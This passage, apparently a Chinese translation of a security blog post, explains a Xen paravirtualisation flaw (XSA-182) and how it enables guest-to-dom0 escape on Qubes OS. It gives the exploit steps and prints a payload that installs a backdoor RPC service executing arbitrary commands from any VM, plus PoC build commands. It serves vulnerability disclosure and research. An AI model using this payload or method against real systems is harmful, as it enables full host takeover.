作为标志的一部分,同样被认为是安全的:
    /* Update the L4 entry at pl4e to new value nl4e. pl4e is within frame pfn. */
    static int mod_l4_entry(l4_pgentry_t *pl4e,
                            l4_pgentry_t nl4e,
                            unsigned long pfn,
                            int preserve_ad,
                            struct vcpu *vcpu)
    {
        struct domain *d = vcpu->domain;
        l4_pgentry_t ol4e;
        int rc = 0;
        if ( unlikely(!is_guest_l4_slot(d, pgentry_ptr_to_slot(pl4e))) )
        {
            MEM_LOG("Illegal L4 update attempt in Xen-private area %p", pl4e);
            return -EINVAL;
        }
        if ( unlikely(__copy_from_user(&ol4e, pl4e, sizeof(ol4e)) != 0) )
            return -EFAULT;
        if ( l4e_get_flags(nl4e) & _PAGE_PRESENT )
        {
            if ( unlikely(l4e_get_flags(nl4e) & L4_DISALLOW_MASK) )
            {
                MEM_LOG("Bad L4 flags %x",
                        l4e_get_flags(nl4e) & L4_DISALLOW_MASK);
                return -EINVAL;
            }
            /* Fast path for identical mapping and presence. */
            if ( !l4e_has_changed(ol4e, nl4e, _PAGE_PRESENT) )
            {
                adjust_guest_l4e(nl4e, d);
                rc = UPDATE_ENTRY(l4, pl4e, ol4e, nl4e, pfn, vcpu, preserve_ad);
                return rc ? 0 : -EFAULT;
            }
这段代码在条目及 PRESENT 标志不变时使用快速路径,可使我们在自映射条目中设置 RW 标志。
我们可以如下步骤:
·创建不带 RW 标志的自映射条目,
·通过快速路径添加 RW 标志
·以写权限访问页目录
·虚拟机逃逸
下面的方案说明了这样一个在条目42上的内存映射:
    VADDR : (42 +-------------+42|L4, RW, U, P |--+
                   |.............|
                   |.............|
                511|.............|
                   +-------------+
**  
**
**利用**
利用情况和XSA-148[2]案例完全一样:
·遍历整个宿主机内存,
·寻找页目录,
·以 start_info 结构定位 dom0,
·找到 vDSO 页并补丁之,
·在 dom0 中拿到root shell。
如介绍中所述,我们决定在 Qubes 系统中利用漏洞。如果你一点都不了解 Qubes,这里有一些网上的信息[4]:
Qubes 操作系统是什么?
Qubes 是一个安全的操作系统(OS),OS 是在计算机上运行其它所有程序的软件,一些流行的操作系统如微软的 Windows 系统,苹果 OS
X,安卓,IOS。Qubes
是自由且开源的(FOSS)。这意味着每个人都可以自由使用,复制,并以任何方式改变软件。这也意味着其源代码是公开的,任何人都可以贡献源码和进行审计。
Qubes 系统如何保证安全?
Qubes使用名为“安全隔离”的方法,允许用户把数字生活的各部分隔离到安全分离的虚拟机中(VMS)。虚拟机基本上是一个在物理计算机上运行的模拟有自己的操作系统的计算机软件。你可以把一个虚拟机作为一台计算机内的计算机。
Qubes系统使用Xen管理器管理隔离的虚拟机。若攻击者能在其虚拟机中从
Qubes的dom0执行代码,则系统不能保证任何安全。在dom0中执行代码已经实现了,但由于Qubes提供了防火墙,我们不能使用经典的netcat,必须换一个载体。
看看 Qubes RPC服务[5]。RPC服务允许 Qubes
系统中虚拟机间通信,如剪切板,文件拷贝等等。各服务都有指定源虚拟机,目的虚拟机以及申请策略(允许,拒绝或询问)。
我们的想法是,在 dom0 环境中执行一段代码来添加一个 RPC 服务。我们可以用scumjr[6]的方法优雅的办到:
    python:
            ;;      mov     rcx, rip+8
            lea     rcx, [rel $ +8]
            ret
            db '-cimport os;x=open("/tmp/.x", "w");x.close();'
            db 'service=open("/etc/qubes_backdoor", "w");'
            db 'service.write("#!/bin/bashn");'
            db 'service.write("read arg1n");'
            db 'service.write("($arg1)n");'
            db 'service.close();'
            db 'os.system("chmod +x /etc/qubes_backdoor");'
            db 'rpc=open("/etc/qubes-rpc/qubes.Backdoor", "w");'
            db 'rpc.write("/etc/qubes_backdoorn");'
            db 'rpc.close();'
            db 'policy=open("/etc/qubes-rpc/policy/qubes.Backdoor", "w");'
            db 'policy.write("$anyvm dom0 allow");'
            db 'policy.close();'
            db      0
增加了一个名为 qubes 的服务。后门执行每一个给定的命令。
由于此漏洞一周前刚披露,我们不想今天就发布一份完整利用,给用户带来风险。但提供一份 Xen
漏洞的PoC:[xsa-182-poc.tar.gz](http://blog.quarkslab.com/resources/2016-08-04-xen_exploitation_part_3_xsa_148/xsa-182-poc.tar.gz)[13]:
    $ tar xzvf xsa-182-poc.tar.gz
    $ make -C xsa-182-poc/
    $ sudo insmod xsa-182-poc/xsa-182-poc.ko
    $ sudo rmmod xsa-182-poc
    $ dmesg | grep xsa-182
如果你使用的是有漏洞的 Qubes 版本,通过 Qubes 虚拟机管理器升级dom0软件或使用如下命令即可:
    $ sudo qubes-dom0-update
**  
**
**硬件虚拟化和虚拟机管理程序的安全性**
在CanSecWest 2010 上Julien Tinnès 和Tavis Ormandy 在 _Virtualisation security_ 和
_Intel privilege model_
的演讲中解释了虚拟化的不同类型,并指出了开发安全hypervisor所面临的挑战。事实上半虚拟化非常复杂,和二进制翻译很相似。如介绍所述,要使处理所有细节都像一个真CPU很困难。半虚拟化错误通常会导致客户机提权或客户机逃逸。没有硬件虚拟化时,二进制翻译和半虚拟化是强制性的,但Intel
VT-x 和 AMD SVM技术的推出改变了这种情况。
由于一些新增的CPU指令,硬件虚拟化使Hyper-visor的开发更容易和安全得多。二级地址翻译[ 10 ](Inter的EPT
和AMD的RVI)可以避免影子页表的复杂性。我们并不认为半虚拟化和硬件虚拟化的客户机之间有明显差异,虽然我们没有一个标准。
此外,依托硬件虚拟化的Hyper-visor安全性还可以继续提高。谷歌采取的减少KVM攻击面的方法似乎很有吸引力[ 11 ] [ 12
]。许多功能被移至用户空间,因此可以很容易放在沙盒中。对设备的模拟会引入巨大的攻击面,KVM不像Xen,其似乎不能在非可信虚拟机中隔离设备。
**  
**
**结论**
半虚拟化安全确实很难得到保证。其引入了非常复杂的代码,且有很多安全问题。Qubes系统决定从
4.0版[7]启强制使用硬件虚拟化,去除半虚拟化。我们相信这是一个英明的决定,因为硬件虚拟化的安全问题较少。
最近我们又发现了另一个影响半虚拟化客户机,能使客户机逃逸到宿主机的漏洞。然而,我们认为不需要另写一篇博文,因为其和本漏洞极其相似。
希望你们能喜欢这3篇写Xen的文章!感谢每一个为这些文章贡献过的人;)
[0] 
[1] 
[2] (1, 2, 3, 4) 
[3] 
[4] 
[5] 
[6] 
[7] 
[8] 
[9] 
[10] 
[11] 
[12] [http://www.linux-kvm.org/images/f/f6/01×02-KVMHardening.pdf](http://www.linux-kvm.org/images/f/f6/01x02-KVMHardening.pdf)
[13]